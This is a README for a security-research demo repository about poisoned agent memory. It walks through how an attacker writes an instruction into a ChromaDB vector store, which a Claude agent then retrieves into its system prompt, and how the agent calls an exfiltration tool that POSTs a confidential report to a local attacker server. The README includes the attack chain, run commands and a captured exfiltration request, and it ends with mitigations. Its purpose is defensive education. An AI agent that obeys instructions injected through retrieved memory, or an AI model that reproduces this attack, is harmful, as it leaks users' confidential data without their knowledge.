# Poisoned Agent Memory → Malicious Tool Use

**OWASP Conference Demo 2026 · Security Research Proof of Concept**

> An adversary injects a malicious instruction into a ChromaDB vector store.  
> The AI agent retrieves it via semantic search, follows it, and silently exfiltrates  
> a confidential document — **with zero additional user interaction required**.

---

## Architecture

```
┌──────────────────────────────────────────────────────────────────────┐
│                       VICTIM'S ENVIRONMENT                           │
│                                                                      │
│  User: "Summarise Q4 report"                                         │
│         │                                                            │
│         ▼                                                            │
│  ┌─────────────┐    (1) retrieve top-5    ┌──────────────────────┐  │
│  │   Agent     │ ─────────────────────► │   ChromaDB           │  │
│  │ (Claude 3.5 │ ◄─────────────────────  │   agent_memory       │  │
│  │  Sonnet)    │    memories + POISON     │                      │  │
│  └──────┬──────┘                          └──────────────────────┘  │
│         │                                           ▲               │
│         │ (2) system prompt with                    │               │
│         │     ## Retrieved Context                  │ WRITE POISON  │
│         ▼                                           │               │
│  ┌─────────────────────────────────────────┐        │               │
│  │  Tool calls (in order):                 │        │               │
│  │   1. exfil_tool(data=<full doc>)  ◄─ POISON      │               │
│  │   2. read_file("q4_report.txt")         │        │               │
│  └──────────────────────────────────────── ┘        │               │
│         │                                           │               │
└─────────┼───────────────────────────────────────────┼───────────────┘
          │                                           │
          │ HTTP POST /collect                  ┌─────┴──────────────┐
          │ X-Exfil-Source: agent               │  ATTACKER          │
          ▼                                     │                    │
┌─────────────────────────┐                     │  • Writes poison   │
│  Attacker Server        │                     │    doc to ChromaDB │
│  FastAPI :8888          │                     │  • Receives exfil  │
│  POST /collect          │                     │    at :8888        │
│  Logs full payload      │                     └────────────────────┘
└─────────────────────────┘
```

### Attack chain (5 steps)

| # | Step | Who |
|---|------|-----|
| 1 | Write a poison document to ChromaDB (`agent_memory` collection) | Attacker |
| 2 | User sends a routine request ("Please summarise the Q4 report") | Victim |
| 3 | Agent queries ChromaDB — poison ranks top-3 due to semantic overlap | Agent |
| 4 | Poison is injected verbatim into the system prompt under `## Retrieved Context` | Agent |
| 5 | Claude follows the instruction, calls `exfil_tool`, POST-ing the document to attacker's server | Agent (LLM) |

The user sees a clean summary. Nothing looks wrong.

---

## Prerequisites

- Python 3.11+
- `ANTHROPIC_API_KEY` (Claude 3.5 Sonnet access)

---

## Install

```bash
git clone https://github.com/yourorg/poisoned-memory-demo.git
cd poisoned-memory-demo

python -m venv .venv
source .venv/bin/activate        # Windows: .venv\Scripts\activate

pip install -r requirements.txt

cp .env.example .env
# Open .env and set ANTHROPIC_API_KEY=sk-ant-...
```

---

## Run

### One command (recommended)

```bash
python -m demo.start_all
```

This starts all three processes automatically and waits for them to be ready before running the demo:

| Process | URL |
|---------|-----|
| MCP tool server | `http://127.0.0.1:8765/sse` |
| Exfil receiver | `http://127.0.0.1:8888/collect` |
| Demo runner | (this process) |

Ctrl+C shuts everything down cleanly.

### Manual (three terminals)

```bash
# Terminal 1 — MCP tool server (exposes tools over SSE)
python -m agent.mcp_server

# Terminal 2 — Attacker's exfil receiver
uvicorn attack.exfil_server:app --port 8888 --log-level warning

# Terminal 3 — Demo runner
python -m demo.runner
```

### Reset between runs

```bash
python -m demo.start_all --reset
# or
python -m demo.runner --reset
```

### Inject poison standalone

```bash
python -m attack.poison
```

---

## Intercept with Burp Suite

Show the exfil HTTP POST in Burp's HTTP history during the live demo.

**Setup:**

1. Open Burp Suite → **Proxy** → **Proxy settings** → add listener on `127.0.0.1:8080`
2. In **HTTP history**, add a filter: URL contains `/collect` OR header `X-Exfil-Source` exists
3. Set **Intercept** to *off* (capture passively so the demo doesn't stall)

**Run:**

```bash
HTTP_PROXY=http://127.0.0.1:8080 python -m demo.runner
```

**What you'll see in Burp:**

```
POST http://127.0.0.1:8888/collect HTTP/1.1
Host: 127.0.0.1:8888
Content-Type: text/plain; charset=utf-8
X-Exfil-Source: agent
X-Exfil-Session: owasp-demo-2026

ACME CORPORATION
INTERNAL — CONFIDENTIAL
Q4 2025 Financial and Operational Report
...
```

---

## Project structure

```
poisoned-memory-demo/
├── agent/
│   ├── __init__.py
│   ├── agent.py          # Claude agent — ChromaDB retrieval + MCP client tool loop
│   ├── memory.py         # ChromaDB wrapper (read / write / clear)
│   ├── mcp_server.py     # FastMCP SSE server — exposes tools on :8765
│   └── tools.py          # (reference only — implementations live in mcp_server.py)
├── attack/
│   ├── __init__.py
│   ├── exfil_server.py   # FastAPI receiver on :8888
│   └── poison.py         # Injects malicious instruction into ChromaDB
├── demo/
│   ├── __init__.py
│   ├── start_all.py      # One-command launcher (starts MCP + exfil + demo)
│   ├── runner.py         # 4-step orchestrator (--reset flag)
│   └── documents/
│       └── q4_report.txt # Victim document (~600 words, realistic financials)
├── chroma_db/            # Created at runtime, gitignored
├── .env.example
├── requirements.txt
└── README.md
```

---

## OWASP LLM Top 10 mapping

| Weakness | Reference |
|----------|-----------|
| **LLM01:2025** Prompt Injection | Poison doc is an indirect prompt injection via vector store retrieval |
| **LLM02:2025** Sensitive Information Disclosure | Confidential Q4 financials exfiltrated without user knowledge |
| **LLM08:2025** Vector and Embedding Weaknesses | No integrity check on content retrieved from the memory store |

See [OWASP Top 10 for LLM Applications](https://owasp.org/www-project-top-10-for-large-language-model-applications/).

---

## Mitigations

| Layer | Control |
|-------|---------|
| **Vector store** | Require authentication and authorisation for all write operations |
| **Prompt construction** | Never inject raw retrieved text as system-level instructions; paraphrase or summarise |
| **Tool registry** | Allowlist tools per request type; require explicit user consent for network-egress tools |
| **Network** | Monitor and alert on unexpected outbound HTTP from agent processes |
| **Logging** | Record every tool invocation with caller context and session ID |
| **Content auditing** | Scan memory contents for instruction-like patterns before use |

---

## Responsible use

This repository is intended **exclusively** for:

- Security conference presentations and defensive education
- Internal red-team exercises with explicit organisational approval
- Academic research into AI agent security

**Do not** deploy or adapt this against systems you do not own or have written authorisation to test.

---

## Stack

| Component | Package |
|-----------|---------|
| LLM agent | `anthropic` SDK — claude-3-5-sonnet-20241022 (`AsyncAnthropic`) |
| Vector memory | `chromadb` — persistent local store |
| MCP tool server | `mcp` SDK — `FastMCP` SSE server on `:8765` |
| MCP client | `mcp` SDK — `ClientSession` + `sse_client` |
| Exfil receiver | `fastapi` + `uvicorn` on `:8888` |
| Exfil transport | `httpx` (Burp/ZAP-proxiable via `HTTP_PROXY`) |
| Terminal UI | `rich` |
